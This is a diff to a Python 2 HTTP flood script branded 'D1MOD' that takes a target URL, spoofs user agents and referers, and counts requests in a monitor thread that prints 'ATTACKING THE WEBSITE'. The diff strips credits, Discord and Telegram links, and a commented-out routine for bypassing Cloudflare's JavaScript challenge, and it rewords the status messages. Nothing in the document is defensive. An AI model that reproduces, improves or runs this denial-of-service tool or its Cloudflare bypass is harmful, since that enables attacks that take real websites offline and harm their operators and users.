@@ -1,8 +1,3 @@
-
-# MADE BY D1MOD
-# D1MOD FROM 1877 TEAM
-# www/1877.team
-
 import urllib2
 import sys
 import threading
@@ -47,24 +42,6 @@ def useragent_list():
 	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
 	return(headers_useragents)
 
-# CLOUDFLARE BYPASSER BY D1MOD
-#def cloudflare_bypass(self, r):
-       # body = r.text
-        #scheme = re.search(r'^([\w]*)', r.url).group(1)
-        #domain = re.search(r'\/\/([^\/]*)', r.url).group(1)
-        #submit_url = '{}://{}/cdn-cgi/l/chk_jschl'.format(scheme, domain)
-        #jschl_vc = re.search(r'name="jschl_vc" value="(\w+)"', body).group(1)
-      #  pas = re.search(r'name="pass" value="(.+?)"', body).group(1)
-        #jschl_answer = str(self.solve_challenge(body) + len(domain))
-    #    time.sleep(5)
-     #   return '{0}?jschl_vc={1}&pass={2}&jschl_answer={3}'.format(submit_url, jschl_vc, pas, jschl_answer)
-
-#ONE_BROWSER_QUERYS_LIMIT = 1500
-
-#ANTI_DDOS_SLEEP_SECS = 600
-
-
-
 # generates a referer array
 def referer_list():
 	global headers_referers
@@ -84,10 +61,8 @@ def buildblock(size):
 
 def usage():
 	print '---------------------------------------------------'
-	print '- USAGE: python2 D1MOD.py <url>'
-	print '- MADE BY D1MOD https://discord.gg/d1mod'
-        print '- 1877 TEAM SITE https://1877.team'
-        print '- 1877 TEAM CHANNEL https://t.me/x1877x'
+	print 'USAGE: python2 D1MOD.py <url>'
+	print 'MADE BY D1MOD'
 	print '---------------------------------------------------'
 
 	
@@ -141,7 +116,7 @@ class MonitorThread(threading.Thread):
 		previous=request_counter
 		while flag==0:
 			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d ATTACKED BY D1MOD1877 ✓" % (request_counter)
+				print "%d D1MOD ATTACKING THE WEBSITE" % (request_counter)
 				previous=request_counter
 		if flag==2:
 			print "\n-- D1MOD Attack Finished --"
